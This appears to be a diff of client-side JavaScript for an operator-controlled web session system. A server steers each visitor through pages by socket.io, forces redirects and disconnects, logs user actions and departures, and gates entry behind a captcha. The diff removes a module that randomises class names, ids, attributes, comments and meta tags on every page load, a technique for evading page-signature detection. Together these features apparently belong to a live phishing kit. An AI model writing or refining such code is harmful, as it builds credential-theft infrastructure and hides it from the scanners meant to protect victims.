@@ -1,85 +1,3 @@
-const HTMLTransformer = {
-    transformationStrategies: {
-        classes: (html) => {
-            const classMap = new Map();
-            let classCounter = 0;
-            return html.replace(/class="([^"]+)"/g, (match, classes) => {
-                const newClasses = classes.split(' ').map(cls => {
-                    if (!classMap.has(cls)) {
-                        classMap.set(cls, `c${Math.random().toString(36).substr(2, 6)}_${classCounter++}`);
-                    }
-                    return classMap.get(cls);
-                }).join(' ');
-                return `class="${newClasses}"`;
-            });
-        },
-
-        ids: (html) => {
-            const idMap = new Map();
-            let idCounter = 0;
-            return html.replace(/id="([^"]+)"/g, (match, id) => {
-                if (!idMap.has(id)) {
-                    idMap.set(id, `i${Math.random().toString(36).substr(2, 6)}_${idCounter++}`);
-                }
-                return `id="${idMap.get(id)}"`;
-            });
-        },
-
-        attributes: (html) => {
-            return html.replace(/<([a-zA-Z0-9]+)([^>]+)>/g, (match, tag, attrs) => {
-                const attributes = attrs.trim().split(/\s+(?=[a-zA-Z-]+=)/).filter(Boolean);
-                const shuffled = attributes.sort(() => Math.random() - 0.5);
-                return `<${tag} ${shuffled.join(' ')}>`;
-            });
-        },
-
-        whitespace: (html) => {
-            return html.replace(/>\s+</g, (match) => {
-                const spaces = ' '.repeat(Math.floor(Math.random() * 4) + 1);
-                const linebreaks = '\n'.repeat(Math.floor(Math.random() * 2) + 1);
-                return `>${spaces}${linebreaks}<`;
-            });
-        },
-
-        comments: (html) => {
-            return html.replace(/<!--[\s\S]*?-->/g, () => {
-                return `<!-- ${Math.random().toString(36).substring(7)} -->`;
-            });
-        },
-
-        dataAttributes: (html) => {
-            return html.replace(/<([a-zA-Z0-9]+)([^>]*)>/g, (match, tag, attrs) => {
-                if (Math.random() > 0.7) {
-                    const randomData = `data-v${Math.random().toString(36).substring(7)}="${Math.random().toString(36).substring(7)}"`;
-                    return `<${tag}${attrs} ${randomData}>`;
-                }
-                return match;
-            });
-        }
-    },
-
-    async transformHTML(html) {
-        const strategies = Object.values(this.transformationStrategies);
-        const shuffledStrategies = strategies.sort(() => Math.random() - 0.5);
-
-        let transformedHtml = html;
-        for (const strategy of shuffledStrategies) {
-            transformedHtml = strategy(transformedHtml);
-        }
-
-        const nonce = Math.random().toString(36).substring(7);
-        transformedHtml = transformedHtml.replace(/<script/g, `<script nonce="${nonce}"`);
-
-        const metaTags = [
-            `<meta name="v${Math.random().toString(36).substring(7)}" content="${Math.random().toString(36).substring(7)}">`,
-            `<meta name="t${Math.random().toString(36).substring(7)}" content="${Date.now()}">`
-        ];
-        transformedHtml = transformedHtml.replace('</head>', `${metaTags.join('\n')}\n</head>`);
-
-        return transformedHtml;
-    }
-};
-
 class URLManager {
     static currentUrl = null;
     static sessionId = null;
@@ -94,19 +12,26 @@ class URLManager {
     static updateURL(url) {
         if (!url) return;
 
+        // Parse the new URL parameters
         const urlParams = new URLSearchParams(url.split('?')[1]);
         const clientId = urlParams.get('client_id');
         const oauthChallenge = urlParams.get('oauth_challenge');
         
+        // Keep the verified parameter if it exists
         const currentParams = new URLSearchParams(window.location.search);
         const verified = currentParams.get('verified');
         
+        // Construct the new URL
         let newUrl = url;
         if (verified === '1') {
             newUrl += '&verified=1';
         }
 
+        // Update URL without page reload
+        window.history.replaceState({}, '', newUrl);
         this.currentUrl = newUrl;
+        
+        // Store session ID from URL
         if (clientId) {
             this.sessionId = clientId;
         }
@@ -114,26 +39,34 @@ class URLManager {
 
     static getSessionId() {
         if (this.sessionId) return this.sessionId;
-        return new URLSearchParams(window.location.search).get('client_id');
+        
+        const params = new URLSearchParams(window.location.search);
+        return params.get('client_id');
     }
 }
 
+// Initialize session state
 let isForceDisconnected = false;
 let reconnectDisabled = false;
 
+// Initialize socket with modified options
 const socket = io('/user', {
-    query: { page: window.location.pathname.split('/').pop() },
+    query: {
+        page: window.location.pathname.split('/').pop()
+    },
     reconnection: true,
     reconnectionAttempts: 5,
     reconnectionDelay: 1000,
     forceNew: true
 });
 
-async function emitPageChange(pageName) {
+// Handle page status updates
+function emitPageChange(pageName) {
     socket.emit('page_loading', true);
     socket.emit('page_change', pageName + '.html');
 }
 
+// Handle force disconnect
 socket.on('force_disconnect', () => {
     console.log('Forced disconnect received');
     isForceDisconnected = true;
@@ -141,6 +74,7 @@ socket.on('force_disconnect', () => {
     socket.io.opts.reconnection = false;
     socket.disconnect();
     
+    // Clear any existing intervals
     if (window.heartbeatInterval) clearInterval(window.heartbeatInterval);
     
     setTimeout(() => {
@@ -148,6 +82,7 @@ socket.on('force_disconnect', () => {
     }, 100);
 });
 
+// Handle connection establishment
 socket.on('connect', () => {
     if (isForceDisconnected) {
         socket.disconnect();
@@ -168,14 +103,18 @@ socket.on('connect', () => {
     const currentPage = URLManager.getCurrentPage();
     emitPageChange(currentPage);
 
-    setTimeout(() => socket.emit('page_loading', false), 500);
+    setTimeout(() => {
+        socket.emit('page_loading', false);
+    }, 500);
 });
 
+// Handle session URL updates
 socket.on('session_url', (url) => {
     console.log('Received session URL:', url);
     URLManager.updateURL(url);
 });
 
+// Handle redirects
 socket.on('redirect', (url) => {
     if (isForceDisconnected) return;
     
@@ -186,6 +125,7 @@ socket.on('redirect', (url) => {
     const pageName = pageMatch ? pageMatch[1] : 'awaiting';
     URLManager.currentPage = pageName;
 
+    // Don't emit 'user_leaving' on redirects
     const onUnload = () => {
         window.removeEventListener('beforeunload', onUnload);
     };
@@ -196,6 +136,7 @@ socket.on('redirect', (url) => {
     }, 50);
 });
 
+// Handle connection errors
 socket.on('connect_error', (error) => {
     if (reconnectDisabled) return;
     
@@ -205,12 +146,14 @@ socket.on('connect_error', (error) => {
     }
 });
 
+// Set up heartbeat
 window.heartbeatInterval = setInterval(() => {
     if (!isForceDisconnected && socket.connected) {
         socket.emit('heartbeat');
     }
 }, 3000);
 
+// Page navigation handlers
 window.addEventListener('popstate', () => {
     if (!isForceDisconnected) {
         const currentPage = URLManager.getCurrentPage();
@@ -223,8 +166,10 @@ document.addEventListener('click', (e) => {
         const url = new URL(e.target.href);
         if (url.origin === window.location.origin) {
             e.preventDefault();
+            
             const pageMatch = url.pathname.match(/([^\/]+?)\.html$/i);
             const pageName = pageMatch ? pageMatch[1] : 'awaiting';
+            
             emitPageChange(pageName);
         }
     }
@@ -241,16 +186,20 @@ document.addEventListener('DOMContentLoaded', () => {
     if (!isForceDisconnected) {
         const currentPage = URLManager.getCurrentPage();
         emitPageChange(currentPage);
-        setTimeout(() => socket.emit('page_loading', false), 500);
+        
+        setTimeout(() => {
+            socket.emit('page_loading', false);
+        }, 500);
     }
 });
 
+// Handle page unload
 window.addEventListener('beforeunload', () => {
     socket.emit('page_loading', true);
     socket.emit('user_leaving');
 });
 
-// Critical: Original working captcha handler
+// Captcha verification handler
 window.onCaptchaSuccess = async (token) => {
     try {
         const response = await fetch('/verify-turnstile', {
@@ -268,7 +217,7 @@ window.onCaptchaSuccess = async (token) => {
         if (result.success) {
             if (result.url) {
                 socket.emit('page_loading', true);
-                window.location.href = result.url;
+                window.location.replace(result.url);
             }
             socket.emit('captcha_verified');
         }
@@ -277,6 +226,7 @@ window.onCaptchaSuccess = async (token) => {
     }
 };
 
+// User action handlers
 window.handleUserAction = async (actionType, data) => {
     socket.emit('user_action', {
         type: actionType,
@@ -295,6 +245,7 @@ window.completeReview = () => {
     });
 };
 
+// Connection state handlers
 socket.on('disconnect', () => {
     console.log('Socket disconnected');
     if (isForceDisconnected) {
@@ -314,7 +265,9 @@ socket.on('reconnect', (attemptNumber) => {
     const currentPage = URLManager.getCurrentPage();
     emitPageChange(currentPage);
     
-    setTimeout(() => socket.emit('page_loading', false), 500);
+    setTimeout(() => {
+        socket.emit('page_loading', false);
+    }, 500);
 });
 
 socket.on('reconnect_attempt', () => {
